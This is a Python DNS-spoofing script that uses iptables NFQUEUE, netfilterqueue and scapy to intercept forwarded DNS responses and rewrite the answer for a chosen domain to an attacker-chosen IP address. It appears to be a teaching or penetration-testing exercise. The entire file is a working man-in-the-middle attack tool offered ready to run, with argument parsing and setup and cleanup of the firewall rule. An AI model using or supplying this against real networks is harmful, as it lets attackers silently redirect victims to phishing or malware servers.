#!/usr/bin/env python

import netfilterqueue, subprocess
import scapy.all as scapy
import argparse

# Create function to pass arguments while calling the program
def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-d", "--domain", dest="domain", help="Set Domain to spoof")
    parser.add_argument("-s", "--spoof-ip", dest="spoof_ip", help="Set IP Address to spoof domain to")
    options = parser.parse_args()
    if not options.domain:
        parser.error("[-] Please specify a domain to spoof using -d or --domain options, use --help for more info.")
    if not options.spoof_ip:
        parser.error("[-] Please specify a spoof ip using -s or --spoof-ip options, use --help for more info.")
    return options

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if options.domain in qname:
            response = scapy.DNSRR(rrname=qname, rdata=options.spoof_ip)
            scapy_packet[scapy.DNS].an = response
            # scapy_packet[scapy.DNS].ancount = 1

            # Delete the important flags to allow scapy reset them
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(str(scapy_packet))   # Set the modeified packet as the packet payload

    packet.accept() # Accept packet for forwarding

try:
    options = get_arguments()
    
    print("[+] Modifying iptables FORWARD chain...")
    subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True) # create a queue rule using NFQUEUE in iptables

    queue = netfilterqueue.NetfilterQueue()     # Create a netfilterqueue object
    queue.bind(0, process_packet)   # Bind the queue object to the rule with queue number 0 and the callback function
    print("[+] Spoofing the ip address of domain " + options.domain + " to " + options.spoof_ip + "...")
    queue.run() # Send the queued packets to the callback function

except KeyboardInterrupt:
    print("\n[+] Resetting iptables FORWARD chain...")
    subprocess.call("iptables -D FORWARD -j NFQUEUE --queue-num 0", shell=True) # delete the queue rule in iptables
